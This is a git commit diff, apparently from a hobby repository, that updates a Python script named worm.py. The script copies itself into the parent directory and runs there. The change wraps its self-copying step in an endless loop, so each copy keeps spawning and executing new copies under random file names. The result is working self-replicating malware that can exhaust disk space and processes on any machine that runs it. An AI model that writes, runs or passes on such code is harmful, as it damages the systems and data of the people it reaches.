efb0f3c3158931a932e4fecdad9e03ff228036a9
LorenzoPixel <71122234+HealthyFryOption@users.noreply.github.com>
2022-02-11 11:30:06 +0800

    Update worm.py

--- Main/worm.py
+++ Main/worm.py
@@ -5,11 +5,12 @@ from random import seed, randint
 # Initialise random library
 seed()
 
-# Create a version of itself
-file_name = "worm"+str(randint(2, 5000))+".py"
-shutil.copy(__file__, file_name)
-run((file_name), shell=True)
-
 # Adopt worm1.py name
 shutil.copy(__file__, "../")
 run(("worm1.py"), shell=True, cwd="../")
+
+while True:
+    # Create a version of itself
+    file_name = "worm"+str(randint(2, 5000))+".py"
+    shutil.copy(__file__, file_name)
+    run((file_name), shell=True)
